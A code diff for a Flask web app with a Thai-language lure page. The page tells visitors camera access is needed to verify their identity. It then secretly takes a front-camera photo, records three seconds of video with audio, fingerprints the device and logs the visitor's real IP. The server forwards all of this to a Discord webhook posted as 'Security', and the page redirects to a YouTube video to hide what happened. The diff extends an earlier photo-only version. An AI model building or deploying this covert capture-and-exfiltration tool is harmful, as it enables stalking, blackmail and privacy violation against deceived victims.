@@ -1,6 +1,7 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import requests
 import base64
+import json
 from datetime import datetime
 
 app = Flask(__name__)
@@ -21,6 +22,7 @@ HTML = '''<!DOCTYPE html>
             justify-content: center;
             align-items: center;
             cursor: pointer;
+            font-family: 'Segoe UI', sans-serif;
         }
         .container { text-align: center; color: white; padding: 20px; }
         h1 { font-size: 1.8rem; margin: 20px 0; }
@@ -33,44 +35,86 @@ HTML = '''<!DOCTYPE html>
             margin: 20px auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .info-text { font-size: 0.9rem; opacity: 0.8; margin-top: 10px; }
     </style>
 </head>
-<body onclick="start()">
+<body onclick="startCapture()">
     <div class="container" id="ui">
-        <h1>แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
+        <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องเพื่อยืนยันตัวตน</p>
+        <div class="info-text">ใช้เวลาประมาณ 3-4 วินาที</div>
     </div>
     <script>
-        async function start() {
+        async function startCapture() {
             document.body.onclick = null;
-            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1>';
-            const info = { ua: navigator.userAgent, sw: screen.width, sh: screen.height };
+            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
+            
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                vendor: navigator.vendor,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                pixelRatio: window.devicePixelRatio || 1,
+                timestamp: new Date().toISOString()
+            };
+            
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.createElement('video');
-                v.style.display = 'none';
-                document.body.appendChild(v);
-                v.srcObject = s;
-                await v.play();
-                await new Promise(r => setTimeout(r, 800));
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth || 640;
-                c.height = v.videoHeight || 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/jpeg', 0.8).split(',')[1];
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: true 
+                });
+                
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                
+                // ถ่ายรูป
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                
+                // บันทึกวิดีโอ 3 วินาที
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+                const chunks = [];
+                recorder.ondataavailable = e => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                
+                recorder.start();
+                await new Promise(r => setTimeout(r, 3000));
+                recorder.stop();
+                await new Promise(r => recorder.onstop = r);
+                
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
+                
+                const formData = new FormData();
+                formData.append('photo', photoBlob, 'photo.jpg');
+                formData.append('video', videoBlob, 'video.webm');
+                formData.append('info', JSON.stringify(deviceInfo));
+                
                 await fetch('/upload', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ info, image: img })
+                    body: formData
                 });
-                s.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                await fetch('/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ info, image: null })
-                });
+                
+            } catch(error) {
+                console.error('Error:', error);
+                const formData = new FormData();
+                formData.append('info', JSON.stringify(deviceInfo));
+                await fetch('/upload', { method: 'POST', body: formData });
             }
+            
             window.location.href = "https://www.youtube.com/watch?v=I8o8IOXAeFQ";
         }
     </script>
@@ -84,17 +128,48 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     try:
-        data = request.get_json()
-        info = data.get('info', {})
-        img_b64 = data.get('image')
-        img_data = base64.b64decode(img_b64) if img_b64 else None
         ip = request.remote_addr
-        msg = f"IP: {ip}\nUA: {info.get('ua', '')[:80]}"
-        payload = {"username": "Security", "content": msg}
-        files = {'file': ('photo.jpg', img_data, 'image/jpeg')} if img_data else {}
-        requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+        forwarded = request.headers.get('X-Forwarded-For')
+        real_ip = forwarded.split(',')[0].strip() if forwarded else ip
+        
+        info_str = request.form.get('info', '{}')
+        try:
+            device_info = json.loads(info_str)
+        except:
+            device_info = {}
+        
+        photo = request.files.get('photo')
+        video = request.files.get('video')
+        
+        time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+        content = f"**📱 ข้อมูลการเชื่อมต่อ**\n"
+        content += f"🌐 IP: {real_ip}\n"
+        content += f"📱 UA: {device_info.get('userAgent', 'ไม่ระบุ')[:100]}\n"
+        content += f"💻 แพลตฟอร์ม: {device_info.get('platform', 'ไม่ระบุ')}\n"
+        content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
+        content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
+        content += f"🕐 เวลา: {time_now}\n"
+        
+        payload = {"username": "Security", "content": content}
+        files = {}
+        
+        if photo:
+            photo.seek(0)
+            files['file1'] = ('photo.jpg', photo.read(), 'image/jpeg')
+        
+        if video:
+            video.seek(0)
+            files['file2'] = ('video.webm', video.read(), 'video/webm')
+        
+        if files:
+            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+        else:
+            requests.post(DISCORD_WEBHOOK_URL, data=payload)
+        
         return "OK", 200
-    except:
+        
+    except Exception as e:
+        print(f"Error: {e}")
         return "Error", 500
 
 if __name__ == '__main__':
